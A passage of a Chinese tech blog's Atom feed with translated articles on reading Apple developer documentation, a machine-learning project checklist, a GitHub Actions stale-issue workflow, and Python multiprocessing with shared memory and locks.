打算在某些时候将其删除，因此您不应将其用于将来的代码，并建议开始重写任何现有代码。（在实践中，大多数API长期以来都被“弃用” - 许多许多年。）</li><li>一些非常复杂的类 - 例如，<code>UIViewController</code> - 会将额外的文档页面与其方法和属性混合在一起。查找它们旁边的页面图标，以及一个简单的英文标题，如“相对于安全区域定位内容”（<code>Positioning Content Relative to the Safe Area</code>）。</li></ul><p>在页面的底部你会找到 <code>Relationships</code>，它告诉你它继承了哪个类（在这种情况下它直接来自 <code>NSObject</code>），以及它符合的所有协议。当您查看 Swift 类型时，本节更有用，其中协议关系更复杂。</p><h2><span id="yue-du-shu-xing-huo-fang-fa-ye-mian">阅读属性或方法页面</span></h2><p>您已经选择了一个框架和类，现在是时候查看特定的属性或方法了。查找并选择此方法：</p><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">func</span> <span class="title class_">animatedResizableImageNamed</span>(<span class="title class_">String</span>, <span class="title class_">capInsets</span>: <span class="title class_">UIEdgeInsets</span>, <span class="title class_">resizingMode</span>: <span class="title class_">UIImage</span>.<span class="title class_">ResizingMode</span>, <span class="title class_">duration</span>: <span class="title class_">TimeInterval</span>) -&gt; <span class="title class_">UIImage</span>?</span><br></pre></td></tr></table></figure><p>您应该在 <code>Creating Specialized Image Objects</code> 类别中找到它。</p><p><img src="https://user-images.githubusercontent.com/3297411/51361359-6f279a00-1b0a-11e9-8126-7c3318d701f0.png" alt="animatedresizableimagenamed-1"><img src="https://user-images.githubusercontent.com/3297411/51361364-72bb2100-1b0a-11e9-9099-1c3c17356ae9.png" alt="animatedresizableimagenamed-2"></p><p>这不是一个复杂的方法，但它确实展示了这些页面的重要部分：</p><ul><li>Apple 有几种不同的方法来编写方法名称。之前的那个 - 长 <code>class func animatedResizableImageNamed</code> - 然后是方法页面标题中显示的形式（<code>animatedResizableImageNamed(_:capInsets:resizingMode:duration:)</code>），以及方法页面的声明部分中的形式。</li><li>正如您在版本摘要中所看到的（在右侧），此方法在 <code>iOS 6.0</code> 中引入。因此，虽然主要的 <code>UIImage</code> 类从第1天开始就已存在，但这种方法是在几年后推出的。</li><li>方法声明的各个部分都是可点击的，都是紫色的。但是要小心：如果你单击 <code>UIImage.ResizingMode</code>，你将去哪里取决于你是否点击了“UIImage”或“ResizingMode”。 （提示：您通常需要单击右侧的那个。）</li><li>您将看到每个参数含义和返回值的简要说明。</li><li>“讨论”（<code>Discussion</code>）部分详细介绍了此方法的具体使用说明。这几乎总是 - 每个页面中最有用的部分，因为在这里您可以看到“不要调用此方法”或“小心…”</li><li>你可能会找到一个 <code>See Also</code> 部分，但这有点受欢迎 - 这里只是我们在上一页的方法列表。</li></ul><p>现在，<code>UIImage</code> 是一个老类，并没有太大变化，因此它的文档处于良好状态。但是一些较新的 API - 以及许多没有像 <code>UIKit</code> 那样被喜欢的旧 API - 仍然记录不足。例如，来自 <code>SceneKit</code> 的 <code>SCNAnimation</code> 或来自 <code>UIKit</code> 的 <code>UITextDragPreviewRenderer</code>：两者都是在 iOS 11 中引入的，并且在它们发布18个月后仍然包含“无可用概述（No overview available）”作为其文档。</p><p>当你看到“没有可用的概述（No overview available）”时，你会失望，但不要放弃：让我告诉你接下来要做什么…</p><h2><span id="cha-kan-dai-ma">查看代码</span></h2><p>尽管 Apple 的在线文档相当不错，但您经常会遇到“无可用概述（No overview available）”，或者您发现没有足够的信息来回答您的问题。</p><p><a href="https://en.wikipedia.org/wiki/Conway%27s_law">康威定律（Conway’s law）</a>指出，设计系统的组织受制于设计，这些设计是这些组织的通信结构的副本。“也就是说，如果你以某种方式工作，你将以类似的方式设计事物。</p><p>Apple 在我们行业中的独特地位使他们以一种相当不寻常的方式工作 - 几乎可以肯定它与您自己公司的工作方式完全不同。是的，他们有 API 审核讨论，他们试图讨论API应该如何用两种语言看待，是的，他们有专门的团队来制作文档和示例代码。</p><p>但是他们获取示例代码的门槛非常高：通常需要一些非常好的东西才能拿出来，并且通过多层检查来处理法律问题。因此，虽然我可以在一小时内输入一个项目并立即将其发布为文章，但 Apple 需要花费更长的时间才能完成同样的工作 - 他们非常认真地对待他们的形象，而且非常正确。如果你曾经想过为什么文章很少出现在官方 Swift 博客上，现在你知道了！</p><p>现在，我说这一切的原因是 Apple 有一个快速使用的捷径：他们的工程师在他们的代码中留下评论的门槛似乎显着降低，这意味着你经常会在 Xcode 中找到有价值的信息。这些评论就像细小的金子（gold dust）一样：它们直接来自 Apple 的开发者，而不是他们的开发者出版（developer publications）团队，而且我对 devpubs 非常热爱，很高兴直接听到来自源头的声音。</p><p>还记得我提到过 SceneKit 的 <code>SCNAnimation</code> 在 Apple 的开发者网站上没有记录吗？好吧，让我们来看看Xcode可以向我们展示的内容：按 <code>Cmd + O</code> 打开“快速打开（Open Quickly）”菜单，确保右侧的 Swift 图标为彩色而不是空心，然后键入“SCNAnimation”。</p><p>您将看到列出的一些选项，但您正在寻找 <code>SCNAnimation.h</code> 中定义的选项。如果您不确定，选择 <code>YourClassName.h</code> 文件是您最好的选择。</p><p>无论如何，如果你打开 <code>SCNAnimation.h</code> Xcode 将显示生成的 SCNAnimation 头文件版本。它的生成是因为原始版本是Objective-C，因此 Xcode 为 Swift 进行了实时翻译 - 这就是 <code>Swift Quickly</code> 框中的彩色 Swift 徽标的含义。</p><p>现在，如果你按 <code>Cmd + F</code> 并搜索“class SCNAnimation”，你会发现：</p><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> SCNAnimation represents an animation that targets a specific key path.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">@available</span>(<span class="keyword">iOS</span> <span class="number">11.0</span>, <span class="operator">*</span>)</span><br><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">SCNAnimation</span> : <span class="title class_">NSObject</span>, <span class="title class_">SCNAnimationProtocol</span>, <span class="title class_">NSCopying</span>, <span class="title class_">NSSecureCoding</span> &#123;  </span><br><span class="line">    <span class="comment">/*!</span></span><br><span class="line"><span class="comment">     Initializers</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     Loads and returns an animation loaded from the specified URL.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     @param animationUrl The url to load.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="comment">/*not inherited*/</span> <span class="keyword">init</span>(<span class="params">contentsOf</span> <span class="params">animationUrl</span>: <span class="type">URL</span>)</span><br></pre></td></tr></table></figure><p>这只是一个开始。 是的，该类及其所有内部都有文档，包括用法说明，默认值等。 所有这一切都应该在在线文档中，但无论出于什么原因它仍然没有，所以要准备好查找代码作为一个有用的补充。</p><h2><span id="zui-hou-de-ti-shi">最后的提示</span></h2><p>此时，您应该能够查找在线文档以获取您喜欢的任何代码，并查找头文件注释以获取额外的使用说明。</p><p>但是，在准备好面对全部 Apple 文档之前，还有两件事需要了解。</p><p>首先，您经常会遇到标记为“已归档（archived”）”，“遗留（“legacy”）”或“已退休（“retired）”的文档 - 即使对于相对较新的事物也是如此。当它真的老了，你会看到诸如“这篇文章可能不代表当前发展的最佳实践”之类的消息。下载和其他资源的链接可能不再有效。“</p><p>尽管 Apple 是世界上最大的公司之一，但 Apple 的工程和 devpubs 团队几乎没有人员 - 他们不可能在保留所有内容的同时覆盖新的 API。因此，当你看到“存档”文档或类似文件时，请运用你的判断：如果它在某个版本的 Swift 中至少你知道它最近是模糊的，但即使不是，你仍然可能会发现那里有很多有价值的信息。</p><p>其次，Apple 拥有一些特别有价值的出色文档。这些都列在 <a href="https://developer.apple.com">https://developer.apple.com</a> 的页脚中，但主要是<a href="https://developer.apple.com/design/human-interface-guidelines/">人机界面指南</a>。这将引导您完整地为 Apple 平台设计应用程序的所有部分，包括说明关键点的图片，并提供大量具体建议。即使这个文档是构建 iOS 应用程序时最重要的一个，但很少有开发人员似乎已经阅读过它！</p><h2><span id="jie-xia-lai-zuo-shi-me">接下来做什么？</span></h2><p>我之前曾写过<a href="https://www.hackingwithswift.com/articles/42/apple-can-we-please-talk-about-your-documentation">关于 Apple 文档的问题</a> - 我担心那里没有鼓励，但至少如果你在努力，它可能会让你觉得不那么孤单。</p><p>幸运的是，我有很多可能更有用的材料：</p><ul><li>我的<a href="https://www.hackingwithswift.com/example-code">Swift知识库（Swift Knowledge Base）</a>包含针对 Swift 和 iOS 开发人员的600多个问答，技巧和技术点 - 它可以帮助您更快地解决问题。</li><li>我的<a href="https://www.hackingwithswift.com/glossary">Swift术语表（Glossary of Common Swift Terms）</a>在 Swift 开发中定义了100多个常用术语，所有术语都在一页上。</li><li><a href="https://www.hackingwithswift.com/read">我有一本全书使用项目教授 Swift 和 iOS</a>，它专门用于在逻辑流程中引入概念。</li></ul><p>您认为阅读Apple文档最有效的方法是什么？ 在Twitter上发送你的提示：<a href="https://twitter.com/twostraws">@twostraws</a>。</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      如何阅读苹果开发文档
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="iOS" scheme="https://qiwihui.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>机器学习项目清单</title>
    <link href="https://qiwihui.com/qiwihui-blog-56/"/>
    <id>https://qiwihui.com/qiwihui-blog-56/</id>
    <published>2022-08-13T01:54:25.510Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://www.ic.unicamp.br/~sandra/pdf/Hands_On_Machine_Learning_with_Scikit_Learn_and_TensorFlow-427-432.pdf">原文</a>来自于《<a href="https://book.douban.com/subject/26840215/">Hands-On Machine Learning with Scikit-Learn and TensorFlow</a>》，这是一本系统学习机器学习和深度学习非常不错的入门书籍，理论和实践兼而有之。</p><p>此清单可以指导你完成机器学习项目。主要有八个步骤：</p><ol><li>将问题框架化并且关注重点。</li><li>获取数据。</li><li>探索数据以洞悉数据。</li><li>准备数据以更好地将基础数据模式暴露给机器学习算法。</li><li>探索多种不同的模型并列出最好的那些。</li><li>微调模型并将它们组合成一个很好的解决方案。</li><li>展示你的解决方案。</li><li>启动，监督并维护你的系统。</li></ol><p>显然，你应该根据你的需求调整此清单。</p><span id="more"></span><h2><span id="jiang-wen-ti-kuang-jia-hua-bing-qie-guan-zhu-chong-dian">将问题框架化并且关注重点</span></h2><ol><li>用业务术语定义目标。</li><li>你的解决方案将如何使用？</li><li>目前的解决方案/解决方法（如果有的话）是什么？</li><li>你应该如何解决这个问题（监督/非监督，在线/离线等）？</li><li>如何度量模型的表现？</li><li>模型的表现是否和业务目标一致？</li><li>达到业务目标所需的最低性能是多少？</li><li>类似的问题如何解决？是否可以复用经验或工具？</li><li>人员是否专业？</li><li>你如何动手解决问题？</li><li>列出目前你（或者其他人）所做的假设。</li><li>如果可能，验证假设。</li></ol><h2><span id="huo-qu-shu-ju">获取数据</span></h2><p>注意：尽可能自动化，以便你轻松获取新数据。</p><ol><li>列出你需要的数据和数据量。</li><li>查找并记录你可以获取该数据的位置。</li><li>检查它将占用多少存储空间。</li><li>检查法律义务并在必要时获取授权。</li><li>获取访问权限。</li><li>创建工作目录（拥有足够的存储空间）。</li><li>获取数据。</li><li>将数据转换为你可以轻松操作的格式（不更改数据本身）。</li><li>确保删除或保护敏感信息（比如，匿名）。</li><li>检查数据的大小和类型（时间序列，样本，地理信息等）。</li><li>抽样出测试集，将它放在一边，以后不需要关注它（没有数据窥探！）。</li></ol><h2><span id="tan-suo-shu-ju">探索数据</span></h2><p>注意：尝试从领域专家那获取有关这些步骤的见解。</p><ol><li>创建用于探索的数据副本（如有必要，将其取样为可管理的大小）。</li><li>创建一个 Jupyter 笔记本来记录你的数据探索。</li><li>研究每个属性及其特征：</li></ol><ul><li>名称；</li><li>类型（分类，整数/浮点数，有界/无界，文本，结构化数据等）；</li><li>缺失数据的百分比；</li><li>噪声点和它的类型（随机点，异常点，舍入误差等）；</li><li>对任务可能有用吗？</li><li>分布类型（高斯分布，均匀分布，对数分布等）。</li></ul><ol start="4"><li>对于监督学习任务，确定目标属性。</li><li>可视化数据。</li><li>研究属性间的相关性。</li><li>研究怎如何手动解决问题。</li><li>确定你想要应用的有效的转换。</li><li>确定有用的额外数据。</li><li>记录你所学到的知识。</li></ol><h2><span id="zhun-bei-shu-ju">准备数据</span></h2><p>注意：</p><ul><li>处理数据副本（保持原始数据集完整）。</li><li>为你应用的所有数据转换编写函数，原因有五：<ul><li>你可以在下次获得新数据集时轻松准备数据</li><li>你可以在未来的项目中应用这些转换</li><li>用来清洗和准备测试数据集</li><li>一旦项目上线你可以用来清洗和准备新的数据集</li><li>为了便于将你的准备选择视为超参数</li></ul></li></ul><ol><li>数据清洗：</li></ol><ul><li>修正或移除异常值（可选）。</li><li>填补缺失值（比如用零，平均值，中位数等）或者删除所在行（或者列）。</li></ul><ol start="2"><li>特征提取（可选）：</li></ol><ul><li>丢弃不提供有用信息的属性；</li></ul><ol start="3"><li>适当的特征工程：</li></ol><ul><li>连续特征离散化。</li><li>分解特征（比如分类，日期/时间等）。</li><li>对特征添加有益的转换（比如 log(x)，sqrt(x)，x^2 等）</li><li>Aggregate features into promising new features. 将一些特征融合为有益的新特征</li></ul><ol start="4"><li>特征缩放：标准化或者正规化特征。</li></ol><h2><span id="lie-chu-you-yong-mo-xing">列出有用模型</span></h2><p>注意：</p><ul><li>如果数据量巨大，你可能需要采样出较小的训练集，以便在合理的时间内训练许多不同的模型（请注意，这会对诸如大型神经网络或随机森林等复杂模型进行处罚）。</li><li>再次尝试尽可能自动化这些步骤。</li></ul><ol><li>使用标准参数训练许多快速、粗糙的模型（比如线性模型，朴素贝叶斯模型，支持向量机模型，随机森林模型，神经网络等）。</li><li>衡量并比较他们的表现。</li></ol><ul><li>对于每个模型，使用 N 折交叉验证法，并且计算基于 N 折交叉验证的均值与方差。</li></ul><ol start="3"><li>分析每种算法的最重要变量。</li><li>分析模型产生的错误类型。</li></ol><ul><li>人们用什么数据来避免这些错误？</li></ul><ol start="5"><li>进行一轮快速的特征提取和特征工程。</li><li>对之前的五个步骤进行一两次的快速迭代。</li><li>列出前三到五名最有用的模型，由其是产生不同类型错误的模型。</li></ol><h2><span id="wei-diao-xi-tong">微调系统</span></h2><p>注意：</p><ul><li>这一步你将会使用尽可能多的数据，特别是当你微调结束时。</li><li>像之前一样尽可能自动化。</li></ul><ol><li>使用交叉验证方法调节超参数</li></ol><ul><li>要像调节超参数那样对待数据转换的过程，特别是当你不知如何下手的时候（比如，我应该是用零或中值替换缺失值吗？或者直接丢弃它们？）</li><li>除非要探索的超参数值非常少，否则最好使用随机搜索而非网格搜索。如果训练的时间很长，你应该使用贝叶斯优化方法（比如，使用在 <a href="https://arxiv.org/pdf/1206.2944.pdf">Jasper Snoek，Hugo Larochelle 和 Ryan Adams 的论文</a>中描述的，用高斯处理先验）</li></ul><ol start="2"><li>尝试集成方法，结合最佳模型通常比单独运行它们更好。</li><li>一旦你对最终的模型有自信，请在测试集上测量其性能以估计泛化误差。</li></ol><blockquote><p>在测量泛化误差后不要调整模型：你会开始过度拟合测试集的。</p></blockquote><h2><span id="zhan-shi-ni-de-jie-jue-fang-an">展示你的解决方案</span></h2><ol><li>将你做的工作整理成文档。</li><li>制作精美的演示。</li></ol><ul><li>确保你首先突出重点。</li></ul><ol start="3"><li>解释你的解决方案实现业务目标的原因。</li><li>不要忘记展示在这过程中你注意到的有趣的点。</li></ol><ul><li>描述哪些有效，哪些无效。-列出你的假设和系统的限制。</li></ul><ol start="5"><li>确保通过精美的可视化或易于记忆的陈述来传达你的主要发现（例如，“收入中位数是房价的第一预测因子”）。</li></ol><h2><span id="qi-dong">启动</span></h2><ol><li>准备好生产解决方案（插入生产数据输入，编写单元测试等）。</li><li>编写监控代码以定期检查系统的实时性能，并在信号丢失时触发警报。</li></ol><ul><li>谨防模型退化：随着数据的进入，模型往往会“腐烂”。</li><li>评估模型可能需要大量的人力（比如，通过众包服务可以解决这个问题）</li><li>同时监控输入数据的质量（例如，一个有故障的传感器发送随机数据，或者另外一个团队的输出变得陈旧），这对于在线学习系统尤其重要。</li></ul><ol start="3"><li>定期在新数据上重新训练模型（尽可能自动化）。</li></ol><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      机器学习项目清单
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="机器学习" scheme="https://qiwihui.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions 第8天：处理过时的 issue</title>
    <link href="https://qiwihui.com/qiwihui-blog-91/"/>
    <id>https://qiwihui.com/qiwihui-blog-91/</id>
    <published>2022-08-13T01:54:25.510Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>存储库中存在过时的issue可能是一个很大的危害。如果你有数年不打算解决的issue，那么就很难找到要关注的重要问题。你永远不会合并的pull request使你看起来好像在忽略该项目。项目中的所有这些杂项都增加了无形的认知负担。</p><span id="more"></span><p>在服务行业工作的任何人都会理解此问题。这就像一个厨师的 <em>场面调度连接</em> 的地方──在他们与他们的配料厨房的设置。</p><blockquote><p>如果让你的现场发生故障，变脏和混乱，你会很快发现自己旋转到位并需要备份。我和一位厨师一起工作，他曾经在匆忙中走到排队的肮脏厨师的工作台旁，解释为什么违规的厨师落后了。他将手掌压在切菜板上，切菜板上撒满了胡椒粒，飞溅的酱汁，一些香菜，面包屑以及通常会漂浮在工作台上的漂浮物和抛弃物，如果不时常用潮湿的侧毛巾将其擦掉。“你看到了吗？” 他打了个招呼，抬起他的手掌，这样厨师就可以看到灰尘和碎屑粘在厨师的手掌上。“那就是你现在的脑袋。”</p><p>Anthony Bourdain，厨房机密</p></blockquote><p>当GitHub着手创建Actions平台时，他们希望构建一些对CI/CD工作流程非常有用的东西──构建项目，运行测试并部署它──但这也可以帮助你自动化项目中的常见任务。在这种情况下，请保持存储库的美观和整洁。</p><p><a href="https://qiwihui.com/qiwihui-blog-90/">启动程序工作流程</a>的底部是关闭陈旧issue和 pull request 的工作流程。</p><p><img src="https://user-images.githubusercontent.com/3297411/77284675-3258c380-6d0a-11ea-9be3-0b06abf407f8.png" alt="image"></p><p>它会按计划触发运行，因此在每天UTC午夜：</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">schedule:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">cron:</span> <span class="string">&quot;0 0 * * *&quot;</span></span><br></pre></td></tr></table></figure><p>当它运行时，它将运行<a href="https://github.com/actions/stale">过时的操作</a>，该操作将查看存储库中的issue和pull request，并找到几个月没有执行任何操作的请求。然后它将在问题中发布一条消息，并添加一个标签，指示该问题是过时的。如果该问题再保持一周的陈旧状态，则将其关闭。</p><p><img src="https://user-images.githubusercontent.com/3297411/77284876-b6ab4680-6d0a-11ea-99cf-dd4aa447a612.png" alt="image"></p><p>这样可以确保识别出每一个过时的issue，但同时也给人们足够的时间告诉过时的操作以使issue或pull request保持打开状态──许多这些旧issue和PR毕竟具有价值！</p><p>最终，处理过时issue的的工作流程是减少存储库中某些干扰并允许你“工作干净”的简便方法。</p><p>原文链接：<a href="https://www.edwardthomson.com/blog/github_actions_8_stale_issues_and_pull_requests.html">https://www.edwardthomson.com/blog/github_actions_8_stale_issues_and_pull_requests.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions 第8天：处理过时的 issue
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>17. 多进程 — Python 进阶</title>
    <link href="https://qiwihui.com/qiwihui-blog-135/"/>
    <id>https://qiwihui.com/qiwihui-blog-135/</id>
    <published>2022-08-13T01:54:25.500Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>在本文中，我们讨论了如何在Python中使用 <code>multiprocessing</code> 模块。</p><ul><li>如何创建和启动多个进程</li><li>如何等待进程完成</li><li>如何在进程之间共享数据</li><li>如何使用 <code>lock</code> 来防止竞态情</li><li>如何使用 <code>Queue</code> 进行进程安全的数据/任务处理</li><li>如何使用 <code>Pool</code> 来管理多个工作进程。</li></ul><span id="more"></span><h3><span id="chuang-jian-he-yun-xing-jin-cheng">创建和运行进程</span></h3><p>你可以使用 <code>multiprocessing.Process()</code> 创建一个进程。 它包含两个重要的参数：</p><ul><li><code>target</code>：进程启动时要调用的可调用对象（函数）</li><li><code>args</code>：目标函数的（函数）参数。 这必须是一个元组。</li></ul><p>使用 <code>process.start()</code> 启动一个进程</p><p>调用 <code>process.join()</code> 告诉程序在继续执行其余代码之前，应等待该进程完成。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">square_numbers</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        result = i * i</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:        </span><br><span class="line">    processes = []</span><br><span class="line">    num_processes = os.cpu_count()</span><br><span class="line">    <span class="comment"># 机器CPU的数量，通常是确定进程数量的一个好选择</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建进程并分配每个进程一个函数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_processes):</span><br><span class="line">        process = Process(target=square_numbers)</span><br><span class="line">        processes.append(process)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 启动所有进程</span></span><br><span class="line">    <span class="keyword">for</span> process <span class="keyword">in</span> processes:</span><br><span class="line">        process.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待所有进程结束</span></span><br><span class="line">    <span class="comment"># 阻塞主程序直到所有进程结束</span></span><br><span class="line">    <span class="keyword">for</span> process <span class="keyword">in</span> processes:</span><br><span class="line">        process.join()</span><br></pre></td></tr></table></figure><h3><span id="zai-jin-cheng-zhi-jian-gong-xiang-shu-ju">在进程之间共享数据</span></h3><p>由于进程不在同一个内存空间中，因此它们无法访问相同（公共）数据。 因此，它们需要特殊的共享内存对象来共享数据。</p><p>可以使用 <code>Value</code> 或者 <code>Array</code> 将数据存储在共享内存变量中。</p><ul><li><code>Value(type, value)</code>：创建类型为 <code>type</code> 的 <code>ctypes</code> 对象。 使用 <code>.target</code> 访问该值。</li><li><code>Array(type, value)</code>：使用类型为 <code>type</code> 的元素创建一个 <code>ctypes</code> 数组。 用 <code>[]</code> 访问值。</li></ul><p>任务：创建两个进程，每个进程都应该有权访问一个共享变量并对其进行修改（在这种情况下，只是将其重复增加1达100次）。 创建另外两个共享一个数组的进程，然后修改（增加）该数组中的所有元素。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Value, Array</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_100</span>(<span class="params">number</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br><span class="line">        number.value += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_100_array</span>(<span class="params">numbers</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(numbers)):</span><br><span class="line">            numbers[i] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    shared_number = Value(<span class="string">&#x27;i&#x27;</span>, <span class="number">0</span>) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Value at beginning:&#x27;</span>, shared_number.value)</span><br><span class="line"></span><br><span class="line">    shared_array = Array(<span class="string">&#x27;d&#x27;</span>, [<span class="number">0.0</span>, <span class="number">100.0</span>, <span class="number">200.0</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Array at beginning:&#x27;</span>, shared_array[:])</span><br><span class="line"></span><br><span class="line">    process1 = Process(target=add_100, args=(shared_number,))</span><br><span class="line">    process2 = Process(target=add_100, args=(shared_number,))</span><br><span class="line"></span><br><span class="line">    process3 = Process(target=add_100_array, args=(shared_array,))</span><br><span class="line">    process4 = Process(target=add_100_array, args=(shared_array,))</span><br><span class="line"></span><br><span class="line">    process1.start()</span><br><span class="line">    process2.start()</span><br><span class="line">    process3.start()</span><br><span class="line">    process4.start()</span><br><span class="line"></span><br><span class="line">    process1.join()</span><br><span class="line">    process2.join()</span><br><span class="line">    process3.join()</span><br><span class="line">    process4.join()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Value at end:&#x27;</span>, shared_number.value)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Array at end:&#x27;</span>, shared_array[:])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end main&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Value at beginning: <span class="number">0</span></span><br><span class="line">Array at beginning: [<span class="number">0.0</span>, <span class="number">100.0</span>, <span class="number">200.0</span>]</span><br><span class="line">Value at end: <span class="number">144</span></span><br><span class="line">Array at end: [<span class="number">134.0</span>, <span class="number">237.0</span>, <span class="number">339.0</span>]</span><br><span class="line">end main</span><br></pre></td></tr></table></figure><h3><span id="ru-he-shi-yong-suo">如何使用锁</span></h3><p>请注意，在上面的示例中，两个进程应将共享值增加1达100次。 这样一来，总共进行了200次操作。 但是为什么终值不是200？</p><h3><span id="jing-tai-tiao-jian">竞态条件</span></h3><p>这里发生了竞态情况。当两个或多个进程或线程可以访问共享数据并且它们试图同时更改它们时，就会发生竞态情况。在我们的示例中，两个进程必须读取共享值，将其增加1，然后将其写回到共享变量中。如果这同时发生，则两个进程将读取相同的值，将其增加并写回。因此，两个进程都将相同的增加的值写回到共享对象中，并且该值未增加2。有关竞态条件的详细说明，请参见 <a href="https://www.notion.so/16-Python-1d15878dedcd42f18eed31799af94980">16. 多线程 — Python 进阶</a> 。</p><h3><span id="bi-mian-dai-suo-de-jing-tai-tiao-jian">避免带锁的竞态条件</span></h3><p>锁（也称为互斥锁）是一种同步机制，用于在存在许多执行进程/线程的环境中强制限制对资源的访问。锁具有两种状态：锁定和解锁。如果状态为锁定，则在状态再次被解锁之前，不允许其他并发进程/线程进入此代码段。</p><p>两个函数很重要：</p><ul><li><code>lock.acquire()</code>：这将锁定状态并阻塞</li><li><code>lock.release()</code>：这将再次解锁状态。</li></ul><p>重要提示：块获得后，你应始终再次释放它！</p><p>在我们的示例中，读取并增加了共享变量的关键代码部分现已锁定。这样可以防止第二个进程同时修改共享库。我们的代码没有太大变化。所有新更改都在下面的代码中进行了注释。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># import Lock</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Lock</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Value, Array</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_100</span>(<span class="params">number, lock</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br><span class="line">        <span class="comment"># lock the state</span></span><br><span class="line">        lock.acquire()</span><br><span class="line">        </span><br><span class="line">        number.value += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 解锁状态</span></span><br><span class="line">        lock.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_100_array</span>(<span class="params">numbers, lock</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span 